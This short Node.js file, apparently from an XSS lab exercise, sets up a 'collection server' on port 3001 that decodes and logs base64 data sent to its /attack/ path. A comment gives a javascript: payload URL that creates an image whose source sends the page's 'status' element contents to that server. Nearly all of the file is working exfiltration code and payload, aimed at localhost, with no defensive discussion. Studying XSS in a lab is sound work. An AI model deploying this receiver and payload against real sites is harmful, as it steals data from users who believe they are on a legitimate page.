require("http")
    .createServer((req, res) => {
        console.log(
            req.connection.remoteAddress,
            Buffer.from(req.url.split("/attack/")[1],
            "base64").toString().trim()
        );
    })
    .listen(3001, () => {
        console.log("Collection Server listening on port 3001");
    });

// This collection server islistening on port 3001, and is another example of an XSS attack, by entering the following into our browser's address field, we get
// The same site renered, but the back button will lead us to the attack script (not featured) by bringing us to a same looking website on port 3001 where an image
// tag is created with a link to our server which is (presumably) designed to collect data from the user who is still under the impression they are at a legitimate site.

// http://localhost:3000/?previous=javascript:(new%20Image().src)=``http://localhost:3001/attack/${btoa(document.getElementById(%22status%22).innerHTML)}``,0/